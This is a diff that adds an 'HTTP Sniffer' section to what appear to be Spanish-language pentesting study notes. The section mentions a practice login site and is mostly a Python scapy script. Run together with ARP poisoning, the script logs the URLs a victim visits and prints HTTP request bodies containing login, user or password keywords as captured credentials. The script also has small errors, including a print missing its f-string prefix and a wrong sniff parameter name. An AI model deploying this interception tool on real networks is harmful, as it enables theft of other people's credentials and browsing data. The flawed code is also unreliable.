@@ -3778,6 +3778,49 @@ if __name__ == “__main__”:
 ```
 
 <h3 class="titulo-principal">Scripting - HTTP Sniffer</h3>
+
+Al lanzar el envenenamiento ARP sniffer en paralelo con el DNS Sniffer podíamos ver los dominios que la máquina consulta a nivel de navegación. Para poder ver datos y ser más intrusivos. Hay que hacer una distinción porque el three way handshake viaja en texto plano, distinto es un panel de autenticación. Página para practicar es testphp.vulnweb.com/login.php
+
+```python
+#!/usr/bin/env python3
+import scapy.all as scapy
+from scapy.layers import http
+import signal
+import sys
+
+def def_handler(sig, frame):
+    print(f"[!] Saliendo...")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def process_packet(packet):
+	cred_keywords = ["login", "user", "pass"]
+	
+	if packet.haslayer(http.HTTPRequest):
+
+		url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
+		print("[!] URL Visitada por la victima: {url}")
+
+		if packet.haslayer(scapy.Raw):
+			try:
+				res = packet[scapy.Raw].load.decode()
+				for keyword in cred_keywords:
+					if keyword in res:
+						print(f"[+] Posibles credenciales: {res}")
+						break
+			except:
+				pass
+
+def sniff(interface):
+	scapy.sniff(iface=interface, prn=process_packet, storage=0)
+
+def main():
+	sniff("enp3s0")
+
+if __name__ == "__main__":
+	main()
+```
     
 <h3 class="titulo-principal">Scripting - HTTPS_Image Sniffer con mitmdump</h3>
 
